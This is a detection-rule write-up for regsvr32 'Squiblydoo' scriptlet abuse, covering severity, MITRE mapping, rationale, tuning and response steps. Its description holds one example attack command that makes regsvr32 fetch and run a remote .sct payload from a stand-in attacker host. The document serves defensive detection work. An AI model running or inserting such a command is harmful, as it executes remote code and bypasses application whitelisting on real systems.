# LOLBAS Abuse - Regsvr32 "Squiblydoo" Scriptlet Execution

**Severity:** High\
**MITRE ATT&CK:** T1218.010 (System Binary Proxy Execution: Regsvr32),
T1027 (Obfuscated Files or Information)\
**Owner:** Jino

## Description

Detects regsvr32.exe invoked with the `/i:` (or `-i:`) switch alongside
scrobj.dll — the "Squiblydoo" technique, first documented by Casey Smith
(@subTee) in 2016 and still actively used. Regsvr32 is intended to
register/unregister DLLs and ActiveX controls, but the `/i:` flag combined
with scrobj.dll causes it to load and execute a COM scriptlet (.sct file)
from either a remote URL or local disk — without actually registering
anything in the Registry. Because regsvr32.exe is a trusted, Microsoft-
signed binary, this technique is specifically used to bypass application
whitelisting (AppLocker and similar controls).

Example malicious command line:
`regsvr32.exe /s /u /i:http://attacker.site/payload.sct scrobj.dll`

## Why this pattern, not "any execution"

Regsvr32 has legitimate, common use for actual DLL/ActiveX registration
(third-party software installers do this routinely). The scrobj.dll +
`/i:` combination is the specific abused surface — normal DLL registration
doesn't invoke scrobj.dll this way, so this combination is a much higher-
confidence signal than regsvr32 execution alone.

## Source

- https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
- Original technique write-up: Casey Smith (@subTee), 2016

## Tuning note

The remote-URL variant (`/i:http://...`) is higher confidence than the
local-file variant (`/i:C:\path\file.sct`), since a local .sct file
requires the attacker to have already staged a file on disk through some
other means. If you want to split confidence tiers further, a rule keyed
specifically on `http` or `https` inside the `/i:` argument would isolate
the "definitely fetching from the internet" case from the broader match.
Some third-party software genuinely uses scrobj.dll for legitimate
scriptlet-based COM registration, though this is rare enough that Splunk's
own detection notes describe false positives here as limited.

## Response action

Alert and investigate promptly — successful execution means arbitrary
script code ran under a trusted, signed process, which is a strong defense-
evasion / initial-execution indicator regardless of what it was used for.
Pull the full command line to get the .sct source (URL or path) for
follow-up IOC extraction.